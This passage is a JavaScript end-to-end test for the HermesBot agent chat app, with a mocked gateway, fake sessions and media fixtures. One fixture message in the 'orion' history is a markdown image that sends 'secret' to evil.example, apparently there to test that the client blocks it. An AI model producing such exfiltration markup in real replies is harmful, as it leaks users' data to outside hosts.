import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import net from 'node:net'
import { spawn, execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { createHash } from 'node:crypto'
import { WebSocket, WebSocketServer } from 'ws'
import { chromium } from 'playwright-core'

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
const execFileAsync = promisify(execFile)
// Test session file (fake cookies), in the temp folder.
const SESSION_FILE = process.env.HERMESBOT_TEST_SESSION_FILE || path.join(os.tmpdir(), 'hermesbot-e2e-session.json')
const SAVED_LOGIN_FILE = `${SESSION_FILE}.credentials`
// CDP vault: separate service, on a disposable keychain (never the session one).
const BROWSER_VAULT_KEYCHAIN = path.join(os.tmpdir(), `hermesbot-e2e-${process.pid}.keychain-db`)
const BROWSER_VAULT_AUDIT = path.join(os.tmpdir(), 'hermesbot-e2e-browser-vault-audit.jsonl')
const BROWSER_VAULT_TOKEN = path.join(os.tmpdir(), `hermesbot-e2e-${process.pid}-vault.token`)
const BROWSER_SECRET = 'cdp-mot-de-passe-test-93842' // gitleaks:allow (fake test password)
const BROWSER_CODE = '654321'
rmSync(SAVED_LOGIN_FILE, { force: true })
rmSync(BROWSER_VAULT_AUDIT, { force: true })
const SCREENSHOTS = new URL('screenshots/', import.meta.url).pathname
const BROWSER_TOUR_OWNER_FILE = path.join(os.tmpdir(), 'hermesbot-e2e-browser-owner')
const BROWSER_TOUR_FIXTURE = path.join(os.tmpdir(), 'hermesbot-e2e-browser-turn.cjs')
rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })
writeFileSync(BROWSER_TOUR_FIXTURE, `#!/usr/bin/env node
const fs = require('node:fs')
let owner = 'libre'
try { owner = fs.readFileSync(process.env.BROWSER_TOUR_OWNER_FILE, 'utf8').trim() || 'libre' } catch {}
// Taken just now, as the arbiter writes it (strftime %z): a turn taken before the chat's last activity no longer counts.
const since = new Date().toISOString().replace(/\\.\\d+Z$/, '+0000')
console.log(\`tour : \${owner} \${since} pid=123 depuis 1 min\\nen file : 0\`)
`, { mode: 0o700 })

// Settings of the test install: never those of private/, bot open at start, hidden provider,
// suggested local model, and fake animations (a 1×1 WebP image) for two bots.
const TEST_DATA = mkdtempSync(path.join(os.tmpdir(), 'hermesbot-e2e-'))
const TEST_CONFIG = path.join(TEST_DATA, 'config.json')
const TEST_ANIMATIONS = path.join(TEST_DATA, 'animations')
writeFileSync(TEST_CONFIG, JSON.stringify({ ui: { defaultBot: 'nova', hiddenProviders: ['hidden-provider'] }, localChat: { model: 'modele-local:7b', name: 'Modèle local' } }))
mkdirSync(TEST_ANIMATIONS)
const TINY_WEBP = Buffer.from('UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==', 'base64')
for (const slug of ['nova', 'orion']) for (const phase of ['working', 'done']) writeFileSync(path.join(TEST_ANIMATIONS, `${slug}-${phase}.webp`), TINY_WEBP)
// A Hermes home for the sign-in without a password: its token, and a control socket that names this very
// process as the gateway. It is: it holds the port of the simulated gateway, which the server checks with lsof.
const LOCAL_TOKEN = 'L'.repeat(43)
const LOCAL_HOME = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'hb-home-')))
chmodSync(LOCAL_HOME, 0o700)
mkdirSync(path.join(LOCAL_HOME, 'webapp'), { mode: 0o700 })
writeFileSync(path.join(LOCAL_HOME, 'webapp', 'session-token'), `${LOCAL_TOKEN}\n`, { mode: 0o600 })
const localControl = net.createServer((socket) => socket.once('data', () => socket.end(`${JSON.stringify({
  ok: true, protocol: 1, id: 1, result: { pid: process.pid, hermes_home: LOCAL_HOME },
})}\n`)))
localControl.listen(path.join(LOCAL_HOME, 'gateway.sock'))
// Off for most of the run: the simulated gateway then asks for a password, as before.
let localMode = false
let localTickets = 0
const localTokenSightings = []
const localSocketOrigins = []
const TEST_ENV = { HERMESBOT_NO_PRIVATE: '1', HERMESBOT_CONFIG: TEST_CONFIG, HERMESBOT_ANIMATIONS: TEST_ANIMATIONS, HERMES_HOME: LOCAL_HOME }

// Files the fake gateway serves for orion's MEDIA: tags.
const MEDIA_FIXTURES = {
  '/Users/test/visuels/slide 01.jpg': ['slide.jpg', 'image/jpeg'],
  '/Users/test/visuels/slide-02.png': ['slide.png', 'image/png'],
  '/Users/test/videos/video.mp4': ['video.mp4', 'video/mp4'],
  '/Users/test/docs/rapport.pdf': ['doc.pdf', 'application/pdf'],
  '/Users/test/docs/page.html': ['doc.html', 'text/html'],
  '/Users/test/docs/note.md': ['doc.md', 'text/markdown'],
  // Images the user sent: Hermes's copy, read back like the bot's media.
  '/Users/test/cache/upload_envoi.png': ['slide.png', 'image/png'],
  '/x/vignette.png': ['slide.png', 'image/png'],
}
const VIDEO_SIZE = readFileSync(new URL('fixtures/video.mp4', import.meta.url)).length
const mediaRequests = []
// Shared settings file: already written by another HermesBot app (the Mac's other window, or a second Mac).
let sharedSettingsFile = JSON.stringify({ version: 1, hiddenModels: ['custom:omlx:qwen-masque'] })
const sharedSettingsWrites = []
// Status forced on /api/auth/me: 503 for an unreachable gateway, 401 for an expired session.
let forcedAuthStatus = 0
// Each login gets a numbered cookie; expiring sessions means refusing past numbers.
let cookieCounter = 0
let expiredBefore = 0
let loginCalls = 0
let loginRefused = false
let logoutCalls = 0
let sessionResumeCalls = 0
// Heartbeat of the app; silentPings makes the gateway stop answering it.
let pingCalls = 0
let silentPings = false
// Requests from the gateway to the app (vault, approvals) and replies received.
const clientResponses = new Map()
let capabilityCalls = 0
let openRequests = []
// Questions (`clarify`): answers received by the fake gateway, and open questions returned on resume.
const promptAnswers = []
const resumePrompts = {}
let lastPromptText = ''
// Turns seen by `session.active_list`, profile by profile: without `profile`, the real gateway only lists `default`.
const liveStatusByProfile = {}
const activeListParams = []
// Work left running without a turn: `subagent.roster` rows by profile, `process.list` and `subagent.list` rows by
// session, `subagent.tail` text by child. Every call is kept to check its exact parameters.
const subagentRosterByProfile = {}
const processListBySession = {}
const subagentListBySession = {}
const subagentTailById = {}
const backgroundCalls = []
let lastApiText
// Simulated gateway slowness, to see the loading screens, isolated local chat.
// Held replies: the test keeps the answer to a method back until it has seen the loading state, then releases it.
// A fixed delay raced with slow machines: the state could come and go while a screenshot was being taken.
const heldReplies = new Map()
const holdReplies = (method) => {
  let release
  heldReplies.set(method, new Promise((resolve) => { release = resolve }))
  return () => { heldReplies.delete(method); release() }
}
let emptyRoster = false
const localChatRequests = []
let localModelMissing = false
const fileAttachCalls = []
const steerCalls = []
const queuedPrompts = []
const interruptCalls = []
// "Test pilotage" turn: it only ends on interruption (priority message).
let pilotageTurn = null
let steerVerdict = { status: 'queued', execution_generation: 1, authority_epoch: 1 }
const imageAttachCalls = []
const analyticsProfiles = []
const remoteRequests = []

function serveMediaFixture(request, response, url, route) {
  const file = url.searchParams.get('path') || ''
  const range = request.headers.range || ''
  mediaRequests.push({ route, path: file, profile: url.searchParams.get('profile'), range })
  const fixture = MEDIA_FIXTURES[file]
  if (!fixture) { response.statusCode = 404; return response.end(JSON.stringify({ detail: 'File not found' })) }
  if (route === 'stream' && !/\.(mp4|mov|webm|mp3|m4a|wav|ogg|opus|flac)$/i.test(file)) {
    response.statusCode = 415
    return response.end(JSON.stringify({ detail: 'Unsupported media type' }))
  }
  const data = readFileSync(new URL(`fixtures/${fixture[0]}`, import.meta.url))
  response.setHeader('Content-Type', fixture[1])
  response.setHeader('Accept-Ranges', 'bytes')
  // The real download route answers as an attachment: the local server must display it inline.
  if (route === 'download') response.setHeader('Content-Disposition', `attachment; filename="${fixture[0]}"`)
  const match = /^bytes=(\d+)-(\d*)$/.exec(range)
  if (!match) {
    response.setHeader('Content-Length', data.length)
    return response.end(data)
  }
  const start = Number(match[1])
  const end = Math.min(match[2] ? Number(match[2]) : data.length - 1, data.length - 1)
  if (start > end) {
    response.statusCode = 416
    response.setHeader('Content-Range', `bytes */${data.length}`)
    return response.end()
  }
  response.statusCode = 206
  response.setHeader('Content-Range', `bytes ${start}-${end}/${data.length}`)
  response.setHeader('Content-Length', end - start + 1)
  response.end(data.subarray(start, end + 1))
}

const mock = http.createServer((request, response) => {
  const url = new URL(request.url, 'http://127.0.0.1:9121')
  response.setHeader('Content-Type', 'application/json')
  if (request.headers['x-hermes-session-token']) localTokenSightings.push(url.pathname)
  const authenticated = localMode
    ? request.headers['x-hermes-session-token'] === LOCAL_TOKEN
    : Number(/hermes_session=test-(\d+)/.exec(String(request.headers.cookie || ''))?.[1] || 0) > expiredBefore
  if (url.pathname === '/api/status' && localMode) {
    return response.end(JSON.stringify({ auth_required: false, auth_providers: [], auth_flows: [] }))
  }
  if (url.pathname === '/auth/password-login') {
    loginCalls += 1
    if (loginRefused) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'invalid_login' })) }
    cookieCounter += 1
    response.setHeader('Set-Cookie', `hermes_session=test-${cookieCounter}; Path=/; HttpOnly; SameSite=Lax`)
    return response.end(JSON.stringify({ ok: true, next: '/' }))
  }
  if (url.pathname === '/auth/logout') {
    logoutCalls += 1
    return response.end(JSON.stringify({ ok: true }))
  }
  if (url.pathname === '/api/auth/me') {
    if (forcedAuthStatus) { response.statusCode = forcedAuthStatus; return response.end(JSON.stringify({ error: 'forced' })) }
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ user_id: 'test', display_name: 'Test', provider: 'loopback' }))
  }
  if (url.pathname === '/api/webapp/socket-ticket' && localMode) {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    localTickets += 1
    return response.end(JSON.stringify({ ticket: 'local-ticket', ttl_seconds: 30 }))
  }
  if (url.pathname === '/api/webapp/socket-ticket') {
    response.statusCode = 403
    return response.end(JSON.stringify({ error: 'forbidden' }))
  }
  // Without a password, Hermes only knows the first ticket endpoint: this one always refuses.
  if (url.pathname === '/api/auth/ws-ticket' && localMode) {
    response.statusCode = 401
    return response.end(JSON.stringify({ error: 'unauthenticated' }))
  }
  if (url.pathname === '/api/auth/ws-ticket') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ ticket: 'test-ticket', ttl_seconds: 30 }))
  }
  // Simulated Ollama: same server, no real model.
  if (url.pathname === '/api/tags' && request.method === 'GET') {
    return response.end(JSON.stringify({ models: localModelMissing ? [{ name: 'autre-local:1b' }] : [{ name: 'modele-local:7b' }, { name: 'autre-local:1b' }] }))
  }
  if (url.pathname === '/api/chat' && request.method === 'POST') {
    const chunks = []
    request.on('data', (chunk) => chunks.push(chunk))
    request.on('end', () => {
      localChatRequests.push(JSON.parse(Buffer.concat(chunks).toString()))
      if (localModelMissing) { response.statusCode = 404; return response.end(JSON.stringify({ error: 'model not found' })) }
      response.setHeader('Content-Type', 'application/x-ndjson')
      const write = (message, done = false) => response.write(`${JSON.stringify({ message: { role: 'assistant', ...message }, done })}\n`)
      setTimeout(() => write({ content: '<think>je réfléchis' }), 30)
      setTimeout(() => write({ content: '</think>Réponse ' }), 60)
      setTimeout(() => write({ content: 'du modèle local.' }), 90)
      setTimeout(() => { write({ content: '' }, true); response.end() }, 130)
    })
    return
  }
  if (url.pathname === '/api/analytics/usage') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    analyticsProfiles.push(url.searchParams.get('profile'))
    const now = new Date()
    const day = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`
    return response.end(JSON.stringify({
      daily: [{ day, input_tokens: 100_000, output_tokens: 5_000, cache_read_tokens: 1_000, reasoning_tokens: 0, estimated_cost: 0.5, actual_cost: 0, sessions: 2, api_calls: 9 }],
      by_model: [{ model: 'claude-opus-5-5', input_tokens: 100_000, output_tokens: 5_000, estimated_cost: 0.5, sessions: 2, api_calls: 9 }],
      totals: { total_input: 100_000, total_output: 5_000, total_cache_read: 1_000, total_reasoning: 0, total_estimated_cost: 0.5, total_actual_cost: 0, total_sessions: 2, total_api_calls: 9 },
      period_days: Number(url.searchParams.get('days')), skills: [], tools: [],
    }))
  }
  if (url.pathname === '/api/cron/jobs') return response.end(JSON.stringify([{ id: 'routine-test', name: 'Nova: Routine test', enabled: true, schedule_display: '0 9 * * *', next_run_at: '2025-01-07T02:00:00Z' }]))
  // The settings file the Mac and iPhone apps share, on the gateway's machine.
  if (url.pathname === '/api/fs/read-text' || url.pathname === '/api/fs/write-text') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    if (url.pathname === '/api/fs/read-text') {
      if (url.searchParams.get('path') !== '~/.hermes/hermesbot-settings.json' || sharedSettingsFile === null) { response.statusCode = 404; return response.end(JSON.stringify({ detail: 'Not found' })) }
      return response.end(JSON.stringify({ text: sharedSettingsFile, path: '/Users/test/.hermes/hermesbot-settings.json' }))
    }
    let raw = ''
    request.on('data', (chunk) => { raw += chunk })
    request.on('end', () => {
      const body = JSON.parse(raw || '{}')
      if (body.path !== '~/.hermes/hermesbot-settings.json') { response.statusCode = 403; return response.end('{}') }
      sharedSettingsFile = body.content
      sharedSettingsWrites.push(JSON.parse(body.content))
      response.end(JSON.stringify({ ok: true }))
    })
    return
  }
  if (url.pathname === '/api/fs/download' || url.pathname === '/api/files/stream') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    return serveMediaFixture(request, response, url, url.pathname === '/api/fs/download' ? 'download' : 'stream')
  }
  response.statusCode = 404
  response.end(JSON.stringify({ error: 'not_found' }))
})

const wss = new WebSocketServer({
  noServer: true,
  handleProtocols: (protocols) => protocols.has('hermes-gateway-v1') ? 'hermes-gateway-v1' : false,
})
let profilesListCalls = 0
// `profiles.configure` as Hermes writes `ui_meta`: per-key merge, `null` deletes, per-key compare-and-swap.
const configureCalls = []
// The next writes find that another app wrote the card just before them (a conflict, then a re-read).
let configureConflicts = 0
// A gateway that does not know the method.
let configureMissing = false
let promptCalls = 0
// New bot (the "+" of the sidebar): `profiles.create` as Hermes answers it, the lazy Bot Chat it gets, its first turn.
const createCalls = []
const sessionCreateCalls = []
const sessionTitleCalls = []
const newBotPrompts = []
const newBotHistory = {}
const NEW_BOT_REPLY = 'Bonjour, je suis Léa Martin, ton nouveau bot. Quel rôle veux-tu me confier ? Dis-moi ce dont je dois m’occuper.'
const modelMutations = []
const routeChecks = []

const profiles = [{
  name: 'nova', model: 'claude-opus-5-5', description: 'Coordinateur',
  canonical_session: { id: 'chat-nova', resolved_id: 'chat-nova', preview: 'Bonjour.', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Nova', description: 'Coordinateur', sectionId: 'direction', sectionName: 'Direction', shape: 'blob', color: 'black' } },
}, {
  name: 'orion', model: 'claude-opus-5-5', description: 'Assistant de test',
  canonical_session: { id: 'chat-orion', resolved_id: 'chat-orion', preview: 'NOREPLY', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Orion', description: 'Assistant de test', sectionId: 'produit', sectionName: 'Produit', shape: 'squircle', color: 'red' } },
}, {
  name: 'default', is_default: true, model: 'claude-opus-5-5',
  canonical_session: { id: 'chat-default', resolved_id: 'chat-default' },
  ui_meta: {},
}, {
  name: 'notify', model: 'deepseek/test',
  canonical_session: { id: 'chat-notify', resolved_id: 'chat-notify' },
  ui_meta: {},
}]

// A bot added for the right-click menu steps only, then taken out again.
const atlasProfile = {
  name: 'atlas', model: 'claude-opus-5-5', description: 'Prépare les itinéraires',
  canonical_session: { id: 'chat-atlas', resolved_id: 'chat-atlas', preview: 'Trois trajets comparés.', last_active: Date.now() - 3_600_000, running: false },
  ui_meta: { 'hermes-bots': { title: 'Atlas', description: 'Prépare les itinéraires', sectionId: 'produit', sectionName: 'Produit', shape: 'hex', color: 'blue', created: 1 } },
  ui_meta_revisions: { 'hermes-bots': 3 },
}

function configureProfile(params) {
  configureCalls.push(structuredClone(params))
  const profile = profiles.find((item) => item.name === params.name)
  if (!profile) return { error: { code: 4064, message: `profile '${params.name}' not found` } }
  const revisions = profile.ui_meta_revisions ||= {}
  if (configureConflicts > 0) {
    configureConflicts -= 1
    revisions['hermes-bots'] = (revisions['hermes-bots'] || 0) + 1
  }
  const incoming = params.ui_meta || {}
  const expected = params.ui_meta_expected_revisions
  const conflicts = Object.fromEntries(Object.keys(expected ? incoming : {}).filter((key) => expected[key] !== (revisions[key] || 0)).map((key) => [key, { expected: expected[key], actual: revisions[key] || 0 }]))
  if (Object.keys(conflicts).length) return { result: { ok: false, applied: { ui_meta: false, ui_meta_conflicts: conflicts } } }
  profile.ui_meta = { ...profile.ui_meta }
  for (const [key, value] of Object.entries(incoming)) {
    if (value === null) delete profile.ui_meta[key]
    else profile.ui_meta[key] = structuredClone(value)
    revisions[key] = (revisions[key] || 0) + 1
  }
  return { result: { ok: true, applied: { ui_meta: true, ui_meta_revisions: Object.fromEntries(Object.keys(incoming).map((key) => [key, revisions[key]])) } } }
}

function send(socket, value) { socket.send(JSON.stringify(value)) }
/** An event pushed by the gateway outside any request (a child working in the background). */
function broadcast(value) { for (const socket of wss.clients) if (socket.readyState === WebSocket.OPEN) send(socket, value) }
function event(sessionId, type, payload) {
  return { jsonrpc: '2.0', method: 'event', params: { type, session_id: sessionId, execution_generation: 1, payload } }
}

wss.on('connection', (socket) => {
  send(socket, { jsonrpc: '2.0', method: 'event', params: { type: 'gateway.ready', payload: { session_authority: true } } })
  socket.on('message', (raw) => {
    const frame = JSON.parse(String(raw))
    if (!frame.id) return
    if (frame.method === undefined) { clientResponses.set(frame.id, frame); return }
    const held = heldReplies.get(frame.method)
    const reply = (result) => { const answer = () => send(socket, { jsonrpc: '2.0', id: frame.id, result }); if (held) void held.then(answer); else answer() }
    if (frame.method === 'client.capabilities') {
      if (frame.params.server_requests === true) capabilityCalls += 1
      return reply({ server_requests: [], declines_not_shown: true })
    }
    if (frame.method === 'gateway.ping') {
      pingCalls += 1
      if (silentPings) return
      return reply({ ok: true })
    }
    if (frame.method === 'profiles.list') {
      profilesListCalls += 1
      return reply({ profiles: emptyRoster ? [] : profiles, bot_mode_protocol: true })
    }
    if (frame.method === 'profiles.configure') {
      if (configureMissing) return send(socket, { jsonrpc: '2.0', id: frame.id, error: { code: -32601, message: 'unknown method: profiles.configure' } })
      const { result, error } = configureProfile(frame.params)
      return error ? send(socket, { jsonrpc: '2.0', id: frame.id, error }) : reply(result)
    }
    if (frame.method === 'profiles.create') {
      createCalls.push(structuredClone(frame.params))
      const name = String(frame.params.name || '').trim()
      const refuse = (code, message) => send(socket, { jsonrpc: '2.0', id: frame.id, error: { code, message } })
      if (!name) return refuse(4061, 'name required')
      if (!/^[a-z0-9][a-z0-9_-]{0,63}$/.test(name) || ['hermes', 'default', 'test', 'tmp', 'root', 'sudo'].includes(name)) return refuse(4062, `'${name}' is not a valid profile name.`)
      if (profiles.some((item) => item.name === name)) return refuse(4062, `A profile named '${name}' already exists.`)
      // No card and no Bot Chat yet: Hermes creates the profile only.
      profiles.splice(profiles.findIndex((item) => item.is_default), 0, { name, model: 'claude-opus-5-5', description: '', canonical_session: null, ui_meta: {}, ui_meta_revisions: {} })
      return reply({ ok: true, name, path: `/x/profiles/${name}`, soul_written: true, model_set: false, mirrored: { env: true, auth: 'shared', model_inherited: true, voice: false } })
    }
    if (frame.method === 'session.list') {
      const profile = profiles.find((item) => item.name === frame.params.profile)
      return reply({ sessions: profile?.canonical_session ? [{ id: profile.canonical_session.id, resolved_id: profile.canonical_session.resolved_id, title: 'Bot Chat', root_title: 'Bot Chat' }] : [] })
    }
    if (frame.method === 'session.create') {
      sessionCreateCalls.push(structuredClone(frame.params))
      const id = `chat-${frame.params.profile}`
      newBotHistory[id] ||= []
      return reply({ session_id: id, stored_session_id: id, message_count: 0, messages: [], info: {} })
    }
    if (frame.method === 'session.title') {
      sessionTitleCalls.push(structuredClone(frame.params))
      return reply({ pending: false, title: frame.params.title })
    }
    if (frame.method === 'session.resume' && newBotHistory[frame.params.session_id]) {
      sessionResumeCalls += 1
      return reply({ session_id: frame.params.session_id, revision: 1, execution_generation: 1, running: false, subscription_id: 'sub-test', open_requests: [], prompts: [], messages: structuredClone(newBotHistory[frame.params.session_id]) })
    }
    if (frame.method === 'session.resume') {
      sessionResumeCalls += 1
      const sessionId = frame.params.session_id
      return reply({
        session_id: sessionId, revision: 4, execution_generation: 1, running: Boolean(resumePrompts[sessionId]) || pilotageTurn?.sessionId === sessionId, subscription_id: 'sub-test',
        open_requests: openRequests, prompts: resumePrompts[sessionId] || [],
        messages: [
          ...Array.from({ length: 30 }, (_, index) => ({
            row_id: index + 1, role: index % 2 ? 'assistant' : 'user', content: `Message ${index + 1}`, timestamp: Date.now() - 120_000 + index * 1000,
          })),
          { row_id: 31, role: 'user', content: 'Présente-toi.', timestamp: Date.now() - 60_000 },
          { row_id: 32, role: 'assistant', content: 'Je suis ton bot Hermes de test.', timestamp: Date.now() - 50_000 },
          ...(sessionId === 'chat-orion' ? [
            { row_id: 33, role: 'assistant', content: '![preuve](https://evil.example/fuite?d=secret)', timestamp: Date.now() - 45_000 },
            { row_id: 133, role: 'user', content: '[IMPORTANT: Background process proc_test completed normally (exit code 0).\nOutput:\nok]\n\n[INTERNAL NOTIFICATION — generated by the Hermes gateway, not written by a human user.]', timestamp: Date.now() - 44_000 },
            { row_id: 134, role: 'user', display_kind: 'async_delegation_complete', content: 'Délégation terminée sans préfixe connu', timestamp: Date.now() - 43_000 },
            { row_id: 136, role: 'user', content: 'Message from 🤖 Nova (@nova): demande entre bots', timestamp: Date.now() - 42_500 },
            { role: 'tool', name: 'delegate_task', tool_call_id: 'call-deleg', timestamp: Date.now() - 42_450, args: { tasks: [{ goal: 'Auditer les liens du site', context: 'Site : exemple.fr. Lister les liens morts, page par page.' }] } },
            { row_id: 138, role: 'user', display_kind: 'async_delegation_complete', timestamp: Date.now() - 42_420, content: '[ASYNC DELEGATION BATCH COMPLETE — deleg_e2e]\nA background fan-out unit you dispatched earlier — 1 subagent(s) — has finished; its consolidated results are below.\n\nRole: leaf   Model: claude-sonnet-5-5   Total duration: 95.0s\n\n--- ✓ TASK 1/1: Auditer les liens du site  (status=completed, api_calls=7, 95.0s) ---\n## Liens morts\n\n- **3** liens morts sur la page Tarifs' },
            { role: 'tool', name: 'message_agent', tool_call_id: 'call-dm-nova', timestamp: Date.now() - 42_400, args: { target: 'nova', message: 'Peux-tu relire le **plan** ?', expecting: 'Un OK écrit' } },
            {
              row_id: 137, role: 'user', display_kind: 'process_complete', timestamp: Date.now() - 42_300, content: [
                '[IMPORTANT: Background process proc_dm completed normally (exit code 0).',
                `Command: /x/python3 /x/tools/bot_mode_dm.py --run-delivery --author '{"id":"bot:orion","name":"orion","is_bot":true}' query-file /tmp/dm.txt --profile-home /x/profiles/nova /x/bin/hermes -p nova`,
                'Output:',
                JSON.stringify({ outcome: '@nova answered.', reply: 'Plan relu, OK écrit. Aperçu : `/Users/test/visuels/slide-02.png`', status: 'settled', delivery_id: 'd1' }),
                ']',
                '',
                '[INTERNAL NOTIFICATION — generated by the Hermes gateway, not written by a human user.]',
              ].join('\n'),
            },
            { row_id: 135, role: 'user', display_kind: 'steer', content: '[OUT-OF-BAND USER MESSAGE — a direct message from the user]\nMessage glissé pendant le tour\n[/OUT-OF-BAND USER MESSAGE]', timestamp: Date.now() - 42_000 },
            { row_id: 34, role: 'assistant', content: 'NOREPLY', timestamp: Date.now() - 40_000 },
            {
              row_id: 35, role: 'assistant', timestamp: Date.now() - 39_000, content: [
                'Voici les images à valider :',
                '',
                'MEDIA:/Users/test/visuels/slide 01.jpg',
                'MEDIA:/Users/test/visuels/slide-02.png',
                '',
                'Et la vidéo :',
                '',
                'MEDIA:/Users/test/videos/video.mp4',
                '',
                'Celle-ci a disparu : MEDIA:/Users/test/visuels/absent.jpg',
                '',
                '```',
                'MEDIA:/Users/test/exemple-de-syntaxe.png',
                '```',
              ].join('\n'),
            },
            { row_id: 36, role: 'user', content: `[The user sent an image~ Here's what I can see:\nUne capture d'écran.]\n[If you need a closer look, use vision_analyze with image_url: /Users/test/cache/upload_envoi.png ~]\n\nRegarde avec @nova\n\n@file:attachments/ancien.pdf\n\n[@mentions resolved from the Bot Mode roster — the user is referring to: @nova = agent profile "nova" ("Nova"). If they want one of these agents contacted, compose your own message.]`, timestamp: Date.now() - 38_000 },
            { row_id: 37, role: 'assistant', content: 'Les documents :\n\nMEDIA:/Users/test/docs/rapport.pdf\n\nMEDIA:/Users/test/docs/page.html\n\nMEDIA:/Users/test/docs/note.md', timestamp: Date.now() - 37_000 },
            // Output quoted by path, without MEDIA:, as some bots do.
            { row_id: 38, role: 'assistant', content: 'Rendu prêt, rien de publié.\n\n**Fichiers** (dossier `/Users/test/visuels/`)\n- Vidéo : `/Users/test/videos/video.mp4`, 57 s.\n- Planche : `slide-02.png`\n- Manquante : `absente.png`\n\n```\nls /Users/test/videos/exemple-cite.mp4\n```', timestamp: Date.now() - 36_000 },
          ] : []),
        ],
      })
    }
    if (frame.method === 'session.history') return reply({ messages: [] })
    if (frame.method === 'session.active_list') {
      activeListParams.push(frame.params)
      const status = liveStatusByProfile[frame.params.profile]
      return reply({ sessions: status ? [{ id: `chat-${frame.params.profile}`, session_key: `chat-${frame.params.profile}`, status }] : [] })
    }
    if (frame.method === 'subagent.roster') {
      backgroundCalls.push({ method: frame.method, params: frame.params })
      return reply({ sessions: subagentRosterByProfile[frame.params.profile] || [] })
    }
    if (frame.method === 'process.list' || frame.method === 'subagent.list' || frame.method === 'subagent.tail') {
      backgroundCalls.push({ method: frame.method, params: frame.params })
      // Like the gateway's ancillary reads: any other key is refused.
      const allowed = new Set(['session_id', 'profile', ...(frame.method === 'subagent.tail' ? ['subagent_id'] : [])])
      if (Object.keys(frame.params).some((key) => !allowed.has(key))) return send(socket, { jsonrpc: '2.0', id: frame.id, error: { code: 4001, message: 'invalid_params', data: { reason: 'invalid_params' } } })
      const sessionId = frame.params.session_id
      if (frame.method === 'process.list') return reply({ processes: processListBySession[sessionId] || [] })
      if (frame.method === 'subagent.list') return reply({ subagents: subagentListBySession[sessionId] || [], delegations: [] })
      const text = subagentTailById[frame.params.subagent_id]
      return reply({ subagent_id: frame.params.subagent_id, available: typeof text === 'string', text: text || '', truncated: false })
    }
    if (frame.method === 'session.events.since') return reply({ events: [], latest_seq: 0, truncated: false, count: 0, epoch: 'test', open_requests: [] })
    if (frame.method === 'model.options') {
      return reply({
        model: 'claude-opus-5-5', provider: 'anthropic',
        providers: [
          { slug: 'anthropic', name: 'Anthropic', authenticated: true, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], pricing: { 'claude-sonnet-5-5': { input: '$2', output: '$10', free: false } } },
          { slug: 'kimi-coding', name: 'Kimi / Moonshot', authenticated: true, models: ['kimi-k3', 'kimi-for-coding'] },
          { slug: 'hidden-provider', name: 'Fournisseur masqué', authenticated: true, models: ['hidden-model'] },
          { slug: 'custom:omlx', name: 'Qwen local (oMLX)', authenticated: true, models: ['qwen-local-27b'] },
          { slug: 'lmstudio', name: 'LM Studio', authenticated: true, models: ['gemma-local'] },
          { slug: 'absent', name: 'Non connecté', authenticated: false, models: ['modele-interdit'] },
        ],
      })
    }
    if (frame.method === 'setup.runtime_check') {
      routeChecks.push(frame.params)
      if (frame.params.provider === 'lmstudio') return reply({ ok: false, provider: 'lmstudio', model: 'gemma-local', error: 'No usable credentials found for lmstudio.' })
      return reply({ ok: true, provider: frame.params.provider, model: 'claude-opus-5-5' })
    }
    if (frame.method === 'session.mutate') {
      modelMutations.push(frame.params)
      if (frame.params.operation !== 'model') throw new Error(`Mutation inattendue: ${frame.params.operation}`)
      if (!frame.params.payload.confirm) {
        return reply({ session_id: frame.params.session_id, operation: 'model', status: 'confirmation_required', confirm: 'confirm-test', confirm_message: 'Confirmer le modèle de test ?', payload: frame.params.payload })
      }
      return reply({ session_id: frame.params.session_id, operation: 'model', model: frame.params.payload.model, provider: frame.params.payload.provider, revision: frame.params.expected_revision + 1, execution_generation: frame.params.expected_generation })
    }
    if (frame.method === 'session.stats') {
      return reply({ input_tokens: 120_000, output_tokens: 8_000, cache_read_tokens: 90_000, cache_write_tokens: 5_000, prompt_tokens: 120_000, completion_tokens: 8_000, total_tokens: 128_000, reasoning_tokens: 900, api_calls: 14, last_prompt_tokens: 41_000, context_tokens: 41_000, context_length: 1_000_000, context_source: 'provider_usage', compression_count: 1, avg_latency_s: 2.5, tokens_per_s: 62.6, last_turn_tokens: 300, active_subagents: 0, model: 'claude-opus-5-5', provider: 'anthropic' })
    }
    if (frame.method === 'session.context_breakdown') {
      return reply({ categories: [{ id: 'conversation', label: 'Conversation', tokens: 30_000, color: '#000' }, { id: 'system', label: 'Instructions', tokens: 11_000, color: '#111' }], context_max: 1_000_000, context_percent: 4.1, context_used: 41_000, estimated_total: 41_000, context_estimated: true, context_source: 'estimate', model: 'claude-opus-5-5', context_files: [{ label: 'SOUL.md', path: '/x/SOUL.md', chars: 100, est_tokens: 25, loaded: true, status: 'ok' }] })
    }
    if (frame.method === 'session.steer') {
      steerCalls.push(frame.params)
      return reply({ text: frame.params.text, ...steerVerdict })
    }
    if (frame.method === 'file.attach') {
      fileAttachCalls.push(frame.params)
      return reply({ attached: true, name: frame.params.name, path: `/x/${frame.params.name}`, ref_path: `attachments/${frame.params.name}`, ref_text: `@file:attachments/${frame.params.name}`, uploaded: true })
    }
    if (frame.method === 'image.attach_bytes') {
      imageAttachCalls.push(frame.params)
